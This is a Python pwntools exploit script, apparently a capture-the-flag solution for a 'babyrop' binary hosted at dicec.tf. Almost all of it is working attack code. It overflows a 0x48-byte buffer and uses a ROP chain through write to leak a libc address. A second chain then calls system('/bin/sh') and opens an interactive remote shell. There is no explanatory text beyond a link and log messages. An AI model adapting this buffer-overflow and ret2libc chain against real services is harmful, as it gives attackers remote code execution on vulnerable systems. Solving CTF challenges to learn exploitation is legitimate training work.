from pwn import * 
# Blind PWn
# https://www.anquanke.com/post/id/196722#h3-2%F0%9F%91%80

context.log_level = "INFO"
bin_file = "./babyrop"
elf = ELF(bin_file)
#libc = elf.libc
libc = ELF('./libc-2.31.so')
rop = ROP(bin_file)
LOCAL = False
HOST = "dicec.tf"
PORT = 31924
# 0x00000000004011d3: pop rdi; ret; 
gs = """continue"""
MAIN_PLT  = elf.symbols['main']
POP_RDI = 0x4011d3
POP_RET = 0x40101a
WRITE_GOT = elf.got["write"]
POP_NEXT = 0x4011B0
POP_INIT = 0x4011CA



if __name__== "__main__":
    LOCAL = False
    #p = process(bin_file)
    p = remote(HOST, PORT)
    log.info("Info Binary\n Main: {0}\n WRITE: {1}".format(hex(MAIN_PLT), hex(WRITE_GOT)))
    p.recvuntil("Your name: ")
#gdb.attach(p, gdbscript=gs)
    payload = flat("A"*0x48)
    payload += p64(POP_INIT)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x1)
    payload += p64(WRITE_GOT)
    payload += p64(0x8)
    payload += p64(WRITE_GOT)
    payload += p64(POP_NEXT)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(0x2)
    payload += p64(0x3)
    payload += p64(0x4)
    payload += p64(0x5)
    payload += p64(0x6)
    payload += p64(MAIN_PLT)
    p.sendline(payload)
    write_addr = u64(p.recv(6).ljust(8,b"\x00"))
    libc.address = write_addr - libc.sym["write"]
    info("Rop Rop Chain")
    info("write_addr ===> 0x%x",write_addr)
    info("libc ===> 0x%x", libc.address)

    bin_sh = next(libc.search(b'/bin/sh'))
    SYSTEM = libc.sym['system']
    info("bin_sh: 0x%x", bin_sh)
    info("SYSTEM: 0x%x", SYSTEM)
   
    p.recvuntil("Your name: ")

    p_2 = flat("A"*0x48)
    p_2 += p64(0x40101a)
    p_2 += p64(POP_RDI)
    p_2 += p64(bin_sh)
    p_2 += p64(SYSTEM)
    p.sendline(p_2)
    p.interactive()

